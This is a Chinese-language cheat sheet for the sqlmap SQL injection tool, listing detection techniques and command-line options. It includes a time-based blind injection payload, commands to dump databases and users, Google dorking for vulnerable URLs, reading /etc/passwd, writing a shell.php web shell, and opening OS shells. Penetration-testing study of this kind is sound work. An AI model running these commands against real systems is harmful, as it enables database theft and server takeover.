### SQLMAP自动注入

> #### 五种漏洞检测技术  
> 
> * 基于布尔的盲注检测
> * 基于时间的盲注检测
> 	* ' and (select * from (select (sleep(20)))a) -- +
> * 基于错误的检测
> * 基于UNIONl联合查询的检测
> 	* 适用于通过for循环直接输出联合查询结果,否则只显示第一项结果
> * 基于堆叠查询的检测
> 	* ;堆叠多个查询语句
> 	* 适用于非select的数据修改,删除的操作

#### 参数
> * `-u url`, 指定url参数,其中必须要包含可注入的parameter
> * `-p param`, 可以指定只对固定的param进行SQL注入的检测
> * `-f`, 指纹检测, 可以检测出mysql版本等
> * `-D database`, 配合`--tables`检测当前database的表
> * `--dump -D database -T table`, 检测database数据库中的table表的所有数据
> * `--users`, 获取数据库用户
> * `--banner`, 提供数据库的banner信息,包括版本等
> * `--dbs`, 获取所有的数据库
> * `--schema`, 获得所有的元数据(各个数据库的表, 表的字段等)
> * `--tables`, 获得所有的表
> * `--columns`, 获得所有的列
> * `-a`, 获得所有能查到的数据(-all)
> * `-d 'mysql://user:password@127.0.0.0/database'`, 直连数据库
> * `-m file.txt`, 可以读取file中的多个url
> * `-g " inurl:\".php?id=1\" "`, 用google搜索结果
> 
> #### POST方法
> * 使用http请求文件(burpsuite)  =>  `sqlmap -r request.txt`
> * 使用burpsuite log文件  =>  `sqlmap -l log.txt`

> #### HTTPS
> * `sqlmap -u "https://1.1.1.1/a.php?a=1:8843" --force-ssl`

> #### 数据段 `--data`
> * get / post 都适用
> `sqlmap.py -u "http://172.16.203.135/mutillidae/index.php?page=home.php" --data="username=1000&password=1&login-php-submit-button=Login" --dbs`

> #### 变量分隔符 `--param-del`
> * `sqlmap -u url --data "q=foo:id=1" --param-del=":" -f `

> #### Cookie头 `--cookie`
> * web应用需要基于cookie的身份验证
> * 检查cookie头中的注入需要level >= 2 (--level 2 ;一共1-5级)
> *  Set-Cookie / --drop-set-cookie / --cookie-del
> * `sqlmap -u url --cookie="a=1;b=2" -f`

> #### User-Agent
> * --user-agent => 默认为: `sqlmap/1.0-dev-xxxxxxxx [http://sqlmap.org]`
> * 可以使用 ` --random-agent `随机从 `sqlmap/txt/user-agents.txt` 字典中选取user-agent
> * sqlmap检查user-agent中的注入点:Level >= 3
> * APP/WAF/IPS/IDS 过滤异常 user-agent 时报错 `[ERROR] the target URL responsed with an unknown HTTP status code, try to force the User-Agent Header with option --user-agent or --random-agent`

> #### Host头
> * `--host` , level = 5 才会被检测注入

> #### Referer头
> * `--referer`, level >= 3 才会被检测注入

> #### 额外的Header
> * `--headers`, 每个头单独一行(名称区分大小写)
> * `sqlmap -u url --headers="Host:www.a.com\nUser-Agent:aaaaa"`

> #### --method
> * `--method=GET/POST`

> #### 读\写文件
> * `--file-read="/etc/passwd"`
> * `--file-write="shell.php" --file-dest="/tmp/shell.php"`

> #### OS
> * `--os-cmd`
> * `--os-shell`
> * `--sql-shell`




